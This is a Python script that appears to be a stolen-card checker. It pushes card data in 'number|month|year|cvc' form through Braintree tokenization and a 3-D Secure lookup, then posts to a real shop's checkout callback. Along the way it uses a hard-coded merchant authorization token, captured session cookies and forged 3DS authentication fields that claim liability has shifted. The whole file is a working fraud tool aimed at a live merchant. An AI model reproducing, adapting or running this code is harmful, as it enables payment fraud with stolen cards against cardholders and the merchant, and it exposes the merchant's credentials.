import requests,re
import user_agent
import base64
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:
		yy = yy.split("20")[1]
	r = requests.session()
	import requests
	
	headers = {
	    'authority': 'payments.braintree-api.com',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9,ar-AE;q=0.8,ar;q=0.7,fr-DZ;q=0.6,fr;q=0.5',
	    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MDQzMTU2MDcsImp0aSI6IjQwNTk4YTA0LTJiOGYtNGEzOC1iYjk3LTgzNDFjYjFhZDI1ZCIsInN1YiI6Imh3M2Nwczc0eXJ3c2JyeGciLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Imh3M2Nwczc0eXJ3c2JyeGciLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.9jP7TJBWBVQh4vjvPa9Qel6CFCNR5o5u9ZKsvF3xQKjorzkjyK_KCyL2cHko2Ca3TSiUoPmrLgdNdwCbtT4KjQ',
	    'braintree-version': '2018-05-10',
	    'content-type': 'application/json',
	    'origin': 'https://assets.braintreegateway.com',
	    'referer': 'https://assets.braintreegateway.com/',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
	}
	
	json_data = {
	    'clientSdkMetadata': {
	        'source': 'client',
	        'integration': 'dropin2',
	        'sessionId': '68dfe04c-d671-4482-9e47-f3583b94aba8',
	    },
	    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
	    'variables': {
	        'input': {
	            'creditCard': {
	                'number': n,
	                'expirationMonth': mm,
	                'expirationYear': yy,
	                'cardholderName': 'modca',
	            },
	            'options': {
	                'validate': False,
	            },
	        },
	    },
	    'operationName': 'TokenizeCreditCard',
	}
	
	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	
	id=(response.json()['data']['tokenizeCreditCard']['token'])
	
	import requests
	
	headers = {
	    'authority': 'api.braintreegateway.com',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9,ar-AE;q=0.8,ar;q=0.7,fr-DZ;q=0.6,fr;q=0.5',
	    'content-type': 'application/json',
	    'origin': 'https://www.fromlucy.com',
	    'referer': 'https://www.fromlucy.com/',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
	}
	
	json_data = {
	    'amount': '33.95',
	    'additionalInfo': {
	        'shippingGivenName': 'Hvhbb',
	        'shippingSurname': 'BBvhjbv',
	        'acsWindowSize': '03',
	        'billingLine1': 'Ubub',
	        'billingLine2': 'Ubyniuun',
	        'billingCity': 'bsns',
	        'billingState': '',
	        'billingPostalCode': '10080',
	        'billingCountryCode': 'VI',
	        'billingGivenName': 'Hvhbb',
	        'billingSurname': 'BBvhjbv',
	        'shippingLine1': 'Ubub',
	        'shippingLine2': 'Ubyniuun',
	        'shippingCity': 'bsns',
	        'shippingState': '',
	        'shippingPostalCode': '10080',
	        'shippingCountryCode': 'VI',
	        'email': 'fcodzilla@gmail.com',
	    },
	    'bin': '403306',
	    'dfReferenceId': '0_eae5d3de-098d-42d8-9519-f01c7043e6a8',
	    'clientMetadata': {
	        'requestedThreeDSecureVersion': '2',
	        'sdkVersion': 'web/3.85.2',
	        'cardinalDeviceDataCollectionTimeElapsed': 931,
	        'issuerDeviceDataCollectionTimeElapsed': 816,
	        'issuerDeviceDataCollectionResult': True,
	    },
	    'authorizationFingerprint': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MDQzMTU2MDcsImp0aSI6IjQwNTk4YTA0LTJiOGYtNGEzOC1iYjk3LTgzNDFjYjFhZDI1ZCIsInN1YiI6Imh3M2Nwczc0eXJ3c2JyeGciLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Imh3M2Nwczc0eXJ3c2JyeGciLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.9jP7TJBWBVQh4vjvPa9Qel6CFCNR5o5u9ZKsvF3xQKjorzkjyK_KCyL2cHko2Ca3TSiUoPmrLgdNdwCbtT4KjQ',
	    'braintreeLibraryVersion': 'braintree/web/3.85.2',
	    '_meta': {
	        'merchantAppId': 'www.fromlucy.com',
	        'platform': 'web',
	        'sdkVersion': '3.85.2',
	        'source': 'client',
	        'integration': 'custom',
	        'integrationType': 'custom',
	        'sessionId': '68dfe04c-d671-4482-9e47-f3583b94aba8',
	    },
	}
	
	response = requests.post(
	    f'https://api.braintreegateway.com/merchants/hw3cps74yrwsbrxg/client_api/v1/payment_methods/{id}/three_d_secure/lookup',
	    headers=headers,
	    json=json_data,
	)
	
	id=(response.json()['paymentMethod']['nonce'])
	
	import requests
	
	cookies = {
	    '_gid': 'GA1.2.472176481.1704201138',
	    'shopping_cart': '4773bc2186aded6bd67aa7bc357d59f473868424',
	    'PHPSESSID': 'johjs33u2mp9icgaa40smorirr',
	    'VPKSignature': '0044c61957d4d1c33dfd6301b734b8a9d3cfade3be17b31b9b72247fe1e09311',
	    '_ga': 'GA1.1.1175995017.1703718213',
	    '_ga_J7W4633SR2': 'GS1.1.1704228888.9.1.1704229208.59.0.0',
	}
	
	headers = {
	    'authority': 'www.fromlucy.com',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9,ar-AE;q=0.8,ar;q=0.7,fr-DZ;q=0.6,fr;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': '_gid=GA1.2.472176481.1704201138; shopping_cart=4773bc2186aded6bd67aa7bc357d59f473868424; PHPSESSID=johjs33u2mp9icgaa40smorirr; VPKSignature=0044c61957d4d1c33dfd6301b734b8a9d3cfade3be17b31b9b72247fe1e09311; _ga=GA1.1.1175995017.1703718213; _ga_J7W4633SR2=GS1.1.1704228888.9.1.1704229208.59.0.0',
	    'origin': 'https://www.fromlucy.com',
	    'referer': 'https://www.fromlucy.com/checkout/pay/',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    'method': 'braintree',
	    'oid': '364312',
	}
	
	data = {
	    'nonce': id,
	    'details[cardholderName]': 'modca',
	    'details[expirationMonth]': '11',
	    'details[expirationYear]': '2027',
	    'details[bin]': '403306',
	    'details[cardType]': 'Visa',
	    'details[lastFour]': '5737',
	    'details[lastTwo]': '37',
	    'type': 'CreditCard',
	    'description': 'ending in 37',
	    'liabilityShifted': 'true',
	    'liabilityShiftPossible': 'true',
	    'threeDSecureInfo[liabilityShifted]': 'true',
	    'threeDSecureInfo[liabilityShiftPossible]': 'true',
	    'threeDSecureInfo[status]': 'authenticate_attempt_successful',
	    'threeDSecureInfo[enrolled]': 'Y',
	    'threeDSecureInfo[cavv]': 'B5gQBTkJBAAAAA1DgmACdQAAAAA=',
	    'threeDSecureInfo[xid]': '',
	    'threeDSecureInfo[acsTransactionId]': 'd7e0fe96-4f1f-4740-bbb4-c5001725d3d6',
	    'threeDSecureInfo[dsTransactionId]': '2f33292c-74cb-4729-926f-a380af5261fe',
	    'threeDSecureInfo[eciFlag]': '06',
	    'threeDSecureInfo[acsUrl]': '',
	    'threeDSecureInfo[paresStatus]': 'A',
	    'threeDSecureInfo[threeDSecureAuthenticationId]': '44zmxndvqz4t35ybw4',
	    'threeDSecureInfo[threeDSecureServerTransactionId]': 'f092cb84-9731-4c32-8b5e-2cdc08493288',
	    'threeDSecureInfo[threeDSecureVersion]': '2.2.0',
	    'threeDSecureInfo[lookup][transStatus]': 'A',
	    'threeDSecureInfo[lookup][transStatusReason]': '',
	    'threeDSecureInfo[authentication][transStatus]': '',
	    'threeDSecureInfo[authentication][transStatusReason]': '',
	    'binData[prepaid]': 'No',
	    'binData[healthcare]': 'No',
	    'binData[debit]': 'Yes',
	    'binData[durbinRegulated]': 'No',
	    'binData[commercial]': 'Unknown',
	    'binData[payroll]': 'No',
	    'binData[issuingBank]': 'Axiom Bank',
	    'binData[countryOfIssuance]': 'USA',
	    'binData[productId]': 'F',
	}
	
	response = requests.post('https://www.fromlucy.com/checkout/callback/', params=params, cookies=cookies, headers=headers, data=data)
	return (response.json()['url'])